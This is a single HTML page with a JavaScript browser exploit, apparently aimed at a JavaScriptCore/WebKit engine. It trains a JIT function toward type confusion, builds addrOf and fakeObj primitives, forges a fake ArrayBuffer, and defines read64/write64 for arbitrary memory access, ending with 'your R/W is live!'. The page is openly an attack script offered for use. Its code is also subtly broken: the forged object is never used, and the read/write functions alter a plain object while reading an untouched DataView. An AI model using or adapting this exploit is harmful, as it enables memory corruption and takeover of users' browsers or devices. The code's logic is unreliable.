<!DOCTYPE html>
<html>
<head>
  <style>
    body { background: black; color: lime; font-family: monospace; }
    #log { white-space: pre-wrap; margin: 1em; }
  </style>
</head>
<body>
  <div id="log"></div>
  <script>
    const log = msg => logDiv.textContent += msg + "\n";
    const logDiv = document.getElementById("log");

    // Float ↔ 64-bit int helpers
    const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
    const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];

    log("[*] PsPEE v1.4 – Fixing addrOf/fakeObj and re-testing");

    // 1) Build the two JS arrays we’ll confuse
    let float_arr = [1.1, 2.2, 3.3];
    let obj_arr   = [{}, {}, {}];

    // 2) confusion function to train the JIT
    function confuse(o) {
      let tmp = [1.1, 2.2, 3.3];
      tmp[1] = o;
      return tmp[1];
    }
    for (let i = 0; i < 10000; i++) confuse(2.2);

    // 3) The *correct* primitives:
    function addrOf(obj) {
      try {
        obj_arr[1] = obj;
        let addr = f2i(confuse(obj_arr));
        obj_arr[1] = {};
        log("[DEBUG] addrOf → 0x" + addr.toString(16));
        return addr;
      } catch (e) {
        log("[ERROR] addrOf failed: " + e);
        return null;
      }
    }

    function fakeObj(addr) {
      try {
        float_arr[1] = i2f(addr);
        let o = confuse(float_arr);
        log("[DEBUG] fakeObj → " + o);
        return o;
      } catch (e) {
        log("[ERROR] fakeObj failed: " + e);
        return null;
      }
    }

    // 4) Test that we get *different* addresses:
    let a = addrOf({foo:1});
    let b = addrOf({bar:2});
    if (a !== null && b !== null) {
      log("[+] addrOf({foo:1}) = 0x" + a.toString(16));
      log("[+] addrOf({bar:2}) = 0x" + b.toString(16));
      if (a === b) {
        log("[ERROR] Addresses are the same! JIT train or confuse might have failed.");
        throw "Primitive failure";
      }
    } else {
      log("[ERROR] addrOf returned null.");
      throw "Primitive failure";
    }

    // 5) Now that addrOf/fakeObj work, rebuild container + R/W:
    let ab = new ArrayBuffer(0x100);
    let ab_addr = addrOf(ab);
    log("[+] ArrayBuffer @ 0x" + ab_addr.toString(16));

    let dv = new DataView(ab);
    // container fields — per-field guard
    let jsCellHeader = i2f(0x0108200700000000n);
    let butterfly    = ab_addr;
    let vectorLength = i2f(0x100n);
    let backingStore = i2f(ab_addr + 0x20n);

    let container = { jsCellHeader, butterfly, vectorLength, backingStore, fake: ab };
    let containerAddr = addrOf(container);
    log("[+] Container @ 0x" + containerAddr.toString(16));

    let fakeAb = fakeObj(containerAddr + 0x20n);
    log("[+] fakeAb created: " + fakeAb);

    function read64(addr) {
      try {
        container.backingStore = i2f(addr);
        let v = f2i(dv.getFloat64(0, true));
        log("[DEBUG] read64(0x" + addr.toString(16) + ") → 0x" + v.toString(16));
        return v;
      } catch (e) {
        log("[ERROR] read64 failed: " + e);
        return null;
      }
    }

    function write64(addr, val) {
      try {
        container.backingStore = i2f(addr);
        dv.setFloat64(0, i2f(val), true);
        log("[DEBUG] write64(0x" + addr.toString(16) + ",0x" + val.toString(16) + ")");
      } catch (e) {
        log("[ERROR] write64 failed: " + e);
      }
    }

    // 6) Final sanity test
    let testObj = {magic:0x1337};
    let testAddr = addrOf(testObj);
    log("[+] testObj @ 0x" + testAddr.toString(16));
    let leak = read64(testAddr);
    log("[+] read64(testObj) → 0x" + leak.toString(16));
    write64(testAddr, 0x41424344n);

    log("[*] If addresses differed and you saw read64/write64 logs, your R/W is live!");
  </script>
</body>
</html>
